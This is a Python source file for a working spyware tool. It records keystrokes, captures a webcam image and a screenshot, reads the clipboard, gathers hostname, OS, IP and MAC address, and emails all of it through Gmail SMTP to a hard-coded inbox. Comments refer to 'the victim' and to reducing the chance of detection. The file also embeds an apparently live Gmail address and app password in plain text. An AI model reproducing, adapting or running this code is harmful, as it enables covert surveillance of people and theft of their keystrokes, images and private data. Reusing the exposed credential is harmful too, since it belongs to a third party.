from pynput import keyboard
import time
import threading
import cv2
from PIL import ImageGrab
import pyperclip
import uuid
import platform
import socket
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders


# class to log the keys and create a log file with intercepted keystrokes in
class KeyLogger:
    # initializing function
    def __init__(self, filename: str = "keystrokes.txt") -> None:
        self.filename = filename

    @staticmethod
    # capture the characters
    def get_chars(keystroke):
        try:
            return keystroke.char
        except AttributeError:
            return str(keystroke)

    # when keystroke is captured, write to the log file
    def on_press(self, keystroke):
        with open(self.filename, 'a') as logs:
            logs.write("Key Pressed =  \"" + self.get_chars(keystroke) + "\"\n")

    # start the listener
    def main(self):
        time_limit_reached = False

        def stop_logger():
            nonlocal time_limit_reached
            time_limit_reached = True

        timer = threading.Timer(20, stop_logger)

        timer.start()

        listener = keyboard.Listener(on_press=self.on_press,)
        listener.start()

        while not time_limit_reached and listener.is_alive():
            time.sleep(1)

        listener.stop()
        timer.cancel()


# Function to take an image from the webcam
def webcam_image():
    # Gains access to the webcam
    webcam_port = 0
    webcam = cv2.VideoCapture(webcam_port)
    # Waits 0.1 seconds to stop the image being a black screen
    time.sleep(0.1)
    # Saves image to a variable
    return_value, image = webcam.read()
    cv2.imwrite("webcam.png", image)
    # Deletes the variable so that webcam becomes unlocked (decreases chance of detection)
    del webcam


# function to take a screenshot of the victims screen
def take_screenshot():
    # assign the name of the screenshot
    filepath = 'screenshot.png'
    # take screenshot
    screenshot = ImageGrab.grab()
    # save screenshot to a png file
    screenshot.save(filepath, 'PNG')


# function to capture clipboard information (can often be email addresses or bank details potentially)
def clipboard():
    # Read the data from the clipboard
    data = pyperclip.paste()
    # Print the data if not empty
    if data == "":
        return "Clipboard is empty"
    else:
        return "Clipboard content: " + data


# function to gather system information such as operating system, IP and MAC addresses
def system_info():
    # gather platform data
    info = platform.uname()
    # Get IP address
    ip_address = socket.gethostbyname(socket.gethostname())
    # Get MAC Address and format it correctly
    mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0, 8*6, 8)][::-1])
    # Put all data in list
    system_data = [info[1], info[5], platform.platform(), ip_address, mac_address]
    return system_data


# Class to create and send email
class EmailSender:
    # Initialization function to specify email and password
    def __init__(self, sender, password):
        self.sender = sender
        self.password = password

    # Function that takes data as input and generates the email
    def send_email(self, recipient, subject, message, attachment_path1, attachment_path2, attachment_path3):
        # Create a multipart email object and assign the sender, recipient and subject
        email = MIMEMultipart()
        email['From'] = self.sender
        email['To'] = recipient
        email['Subject'] = subject

        # Attach the message to the email
        email.attach(MIMEText(message, 'plain'))

        # Open the file in binary mode
        with open(attachment_path1, 'rb') as attachment:
            # Create a MIMEBase object and set the appropriate MIME type for the attachment
            part1 = MIMEBase('application', 'octet-stream')
            part1.set_payload(attachment.read())

        with open(attachment_path2, 'rb') as attachment:
            # Create a MIMEBase object and set the appropriate MIME type for the attachment
            part2 = MIMEBase('application', 'octet-stream')
            part2.set_payload(attachment.read())

        with open(attachment_path3, 'rb') as attachment:
            # Create a MIMEBase object and set the appropriate MIME type for the attachment
            part3 = MIMEBase('application', 'octet-stream')
            part3.set_payload(attachment.read())

        # Encode the attachment in ASCII characters to send by email
        encoders.encode_base64(part1)
        encoders.encode_base64(part2)
        encoders.encode_base64(part3)
        # Add a header to specify the filename of the attachment
        part1.add_header('Content-Disposition', f"attachment; filename= {attachment_path1}")
        part2.add_header('Content-Disposition', f"attachment; filename= {attachment_path2}")
        part3.add_header('Content-Disposition', f"attachment; filename= {attachment_path3}")

        # Add the attachment to the email
        email.attach(part1)
        email.attach(part2)
        email.attach(part3)

        # Connect to the gmail SMTP server and send the email
        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login(self.sender, self.password)
            server.sendmail(self.sender, recipient, email.as_string())


# run keylogger
if __name__ == "__main__":
    webcam_image()
    take_screenshot()
    logger = KeyLogger()
    logger.main()
    time.sleep(20)

system_data = system_info()

sender_email = "redpanda121003@gmail.com"
sender_password = "pneewfuoyynmqctj"

email_sender = EmailSender(sender_email, sender_password)

recipient_email = "redpanda121003@gmail.com"
email_subject = "Keylogger Data"
email_message = '''\

The following data was retrieved:

Hostname: {system_data[0]}
Processor Model: {system_data[1]}
Operating System: {system_data[2]}
IP Address: {system_data[3]}
MAC Address: {system_data[4]}

{clipboard}

\
'''.format(system_data=system_data, clipboard=clipboard())

keystrokes_file = "keystrokes.txt"
webcam_file = "webcam.png"
screenshot_file = "screenshot.png"

email_sender.send_email(recipient_email, email_subject, email_message, keystrokes_file, webcam_file, screenshot_file)
